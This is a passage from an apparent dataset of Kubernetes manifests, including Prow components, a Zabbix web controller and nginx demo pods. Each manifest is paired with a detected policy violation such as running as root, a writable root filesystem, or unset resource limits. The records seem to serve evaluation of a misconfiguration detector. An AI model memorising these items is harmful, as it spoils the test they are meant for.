    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: plank\n  labels:\n    app: plank\nspec:\n  selector:\n    matchLabels:\n      app: plank\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: plank\n    spec:\n      serviceAccountName: plank\n      containers:\n      - name: plank\n        image: gcr.io/k8s-prow/plank:v20200319-1aea24112\n        args:\n        - --dry-run=false\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/workload-clusters/config\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        volumeMounts:\n        - name: kubeconfig\n          mountPath: /etc/workload-clusters\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: cluster\n          mountPath: /etc/cluster\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          secretName: workload-clusters-kubeconfig\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: cluster\n        secret:\n          defaultMode: 420\n          secretName: workload-cluster\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"plank\" is not set to runAsNonRoot"
  },
  {
    "id": "03754",
    "manifest_path": "data/manifests/the_stack_sample/sample_1671.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: plank\n  labels:\n    app: plank\nspec:\n  selector:\n    matchLabels:\n      app: plank\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: plank\n    spec:\n      serviceAccountName: plank\n      containers:\n      - name: plank\n        image: gcr.io/k8s-prow/plank:v20200319-1aea24112\n        args:\n        - --dry-run=false\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/workload-clusters/config\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        volumeMounts:\n        - name: kubeconfig\n          mountPath: /etc/workload-clusters\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: cluster\n          mountPath: /etc/cluster\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          secretName: workload-clusters-kubeconfig\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: cluster\n        secret:\n          defaultMode: 420\n          secretName: workload-cluster\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"plank\" has cpu request 0"
  },
  {
    "id": "03755",
    "manifest_path": "data/manifests/the_stack_sample/sample_1671.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: plank\n  labels:\n    app: plank\nspec:\n  selector:\n    matchLabels:\n      app: plank\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: plank\n    spec:\n      serviceAccountName: plank\n      containers:\n      - name: plank\n        image: gcr.io/k8s-prow/plank:v20200319-1aea24112\n        args:\n        - --dry-run=false\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/workload-clusters/config\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        volumeMounts:\n        - name: kubeconfig\n          mountPath: /etc/workload-clusters\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: cluster\n          mountPath: /etc/cluster\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          secretName: workload-clusters-kubeconfig\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: cluster\n        secret:\n          defaultMode: 420\n          secretName: workload-cluster\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"plank\" has memory limit 0"
  },
  {
    "id": "03756",
    "manifest_path": "data/manifests/the_stack_sample/sample_1672.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: zabbix-web\n  labels:\n    app: zabbix\n    tier: zabbix-web\n  namespace: zabbix\nspec:\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        name: zabbix-web\n        app: zabbix\n    spec:\n      containers:\n      - name: zabbix-web\n        image: zabbix/zabbix-web-nginx-mysql:alpine-5.0-latest\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n          name: web-http\n        - containerPort: 8443\n          name: web-https\n        env:\n        - name: ZBX_SERVER_NAME\n          value: Zabbix kubernetes\n        - name: PHP_TZ\n          value: Europe/Riga\n        - name: MYSQL_USER\n          valueFrom:\n            secretKeyRef:\n              name: db-secret\n              key: db-zbx-user\n        - name: MYSQL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: db-secret\n              key: db-zbx-pass\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: db-secret\n              key: db-root-pass\n        - name: MYSQL_DATABASE\n          value: zabbix\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"zabbix-web\" does not have a read-only root file system"
  },
  {
    "id": "03757",
    "manifest_path": "data/manifests/the_stack_sample/sample_1672.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: zabbix-web\n  labels:\n    app: zabbix\n    tier: zabbix-web\n  namespace: zabbix\nspec:\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        name: zabbix-web\n        app: zabbix\n    spec:\n      containers:\n      - name: zabbix-web\n        image: zabbix/zabbix-web-nginx-mysql:alpine-5.0-latest\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n          name: web-http\n        - containerPort: 8443\n          name: web-https\n        env:\n        - name: ZBX_SERVER_NAME\n          value: Zabbix kubernetes\n        - name: PHP_TZ\n          value: Europe/Riga\n        - name: MYSQL_USER\n          valueFrom:\n            secretKeyRef:\n              name: db-secret\n              key: db-zbx-user\n        - name: MYSQL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: db-secret\n              key: db-zbx-pass\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: db-secret\n              key: db-root-pass\n        - name: MYSQL_DATABASE\n          value: zabbix\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"zabbix-web\" is not set to runAsNonRoot"
  },
  {
    "id": "03758",
    "manifest_path": "data/manifests/the_stack_sample/sample_1672.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: zabbix-web\n  labels:\n    app: zabbix\n    tier: zabbix-web\n  namespace: zabbix\nspec:\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        name: zabbix-web\n        app: zabbix\n    spec:\n      containers:\n      - name: zabbix-web\n        image: zabbix/zabbix-web-nginx-mysql:alpine-5.0-latest\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n          name: web-http\n        - containerPort: 8443\n          name: web-https\n        env:\n        - name: ZBX_SERVER_NAME\n          value: Zabbix kubernetes\n        - name: PHP_TZ\n          value: Europe/Riga\n        - name: MYSQL_USER\n          valueFrom:\n            secretKeyRef:\n              name: db-secret\n              key: db-zbx-user\n        - name: MYSQL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: db-secret\n              key: db-zbx-pass\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: db-secret\n              key: db-root-pass\n        - name: MYSQL_DATABASE\n          value: zabbix\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"zabbix-web\" has cpu request 0"
  },
  {
    "id": "03759",
    "manifest_path": "data/manifests/the_stack_sample/sample_1672.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: zabbix-web\n  labels:\n    app: zabbix\n    tier: zabbix-web\n  namespace: zabbix\nspec:\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        name: zabbix-web\n        app: zabbix\n    spec:\n      containers:\n      - name: zabbix-web\n        image: zabbix/zabbix-web-nginx-mysql:alpine-5.0-latest\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n          name: web-http\n        - containerPort: 8443\n          name: web-https\n        env:\n        - name: ZBX_SERVER_NAME\n          value: Zabbix kubernetes\n        - name: PHP_TZ\n          value: Europe/Riga\n        - name: MYSQL_USER\n          valueFrom:\n            secretKeyRef:\n              name: db-secret\n              key: db-zbx-user\n        - name: MYSQL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: db-secret\n              key: db-zbx-pass\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: db-secret\n              key: db-root-pass\n        - name: MYSQL_DATABASE\n          value: zabbix\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"zabbix-web\" has memory limit 0"
  },
  {
    "id": "03760",
    "manifest_path": "data/manifests/the_stack_sample/sample_1673.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1357\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03761",
    "manifest_path": "data/manifests/the_stack_sample/sample_1673.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1357\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "03762",
    "manifest_path": "data/manifests/the_stack_sample/sample_1673.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1357\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "03763",
    "manifest_path": "data/manifests/the_stack_sample/sample_1673.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1357\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "03764",
    "manifest_path": "data/manifests/the_stack_sample/sample_1673.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1357\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "03765",
    "manifest_path": "data/manifests/the_stack_sample/sample_1674.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20210514-64850e516d\n        args:\n        - --dry-run=false\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-graphql-endpoint=http://ghproxy/graphql\n        - --gcs-credentials-file=/etc/gcs-credentials/service-account.json\n        - --status-path=gs://prow-tidb-logs/tide-status\n        - --history-uri=gs://prow-tidb-logs/tide-history.json\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: gcs-credentials\n          mountPath: /etc/gcs-credentials\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: config\n        configMap:\n          name: config\n      - name: gcs-credentials\n        secret:\n          secretName: gcs-credentials\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"tide\" does not have a read-only root file system"
  },
  {
    "id": "03766",
    "manifest_path": "data/manifests/the_stack_sample/sample_1674.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20210514-64850e516d\n        args:\n        - --dry-run=false\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-graphql-endpoint=http://ghproxy/graphql\n        - --gcs-credentials-file=/etc/gcs-credentials/service-account.json\n        - --status-path=gs://prow-tidb-logs/tide-status\n        - --history-uri=gs://prow-tidb-logs/tide-history.json\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: gcs-credentials\n          mountPath: /etc/gcs-credentials\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: config\n        configMap:\n          name: config\n      - name: gcs-credentials\n        secret:\n          secretName: gcs-credentials\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"tide\" is not set to runAsNonRoot"
  },
  {
    "id": "03767",
    "manifest_path": "data/manifests/the_stack_sample/sample_1674.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20210514-64850e516d\n        args:\n        - --dry-run=false\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-graphql-endpoint=http://ghproxy/graphql\n        - --gcs-credentials-file=/etc/gcs-credentials/service-account.json\n        - --status-path=gs://prow-tidb-logs/tide-status\n        - --history-uri=gs://prow-tidb-logs/tide-history.json\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: gcs-credentials\n          mountPath: /etc/gcs-credentials\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: config\n        configMap:\n          name: config\n      - name: gcs-credentials\n        secret:\n          secretName: gcs-credentials\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"tide\" has cpu request 0"
  },
  {
    "id": "03768",
    "manifest_path": "data/manifests/the_stack_sample/sample_1674.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20210514-64850e516d\n        args:\n        - --dry-run=false\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-graphql-endpoint=http://ghproxy/graphql\n        - --gcs-credentials-file=/etc/gcs-credentials/service-account.json\n        - --status-path=gs://prow-tidb-logs/tide-status\n        - --history-uri=gs://prow-tidb-logs/tide-history.json\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: gcs-credentials\n          mountPath: /etc/gcs-credentials\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: config\n        configMap:\n          name: config\n      - name: gcs-credentials\n        secret:\n          secretName: gcs-credentials\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"tide\" has memory limit 0"
  },
  {
    "id": "03769",
    "manifest_path": "data/manifests/the_stack_sample/sample_1677.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-3229\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03770",
    "manifest_path": "data/manifests/the_stack_sample/sample_1677.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-3229\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "03771",
    "manifest_path": "data/manifests/the_stack_sample/sample_1677.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-3229\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "03772",
    "manifest_path": "data/manifests/the_stack_sample/sample_1677.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-3229\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "03773",
    "manifest_path": "data/manifests/the_stack_sample/sample_1677.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-3229\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "03774",
    "manifest_path": "data/manifests/the_stack_sample/sample_1678.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20210624-69a9f34cd9\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://fakeghserver\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"deck\" does not have a read-only root file system"
  },
  {
    "id": "03775",
    "manifest_path": "data/manifests/the_stack_sample/sample_1678.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20210624-69a9f34cd9\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://fakeghserver\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"deck\" is not set to runAsNonRoot"
  },
  {
    "id": "03776",
    "manifest_path": "data/manifests/the_stack_sample/sample_1678.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20210624-69a9f34cd9\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://fakeghserver\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"deck\" has cpu request 0"
  },
  {
    "id": "03777",
    "manifest_path": "data/manifests/the_stack_sample/sample_1678.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20210624-69a9f34cd9\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://fakeghserver\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"deck\" has memory limit 0"
  },
  {
    "id": "03778",
    "manifest_path": "data/manifests/the_stack_sample/sample_1681.yaml",
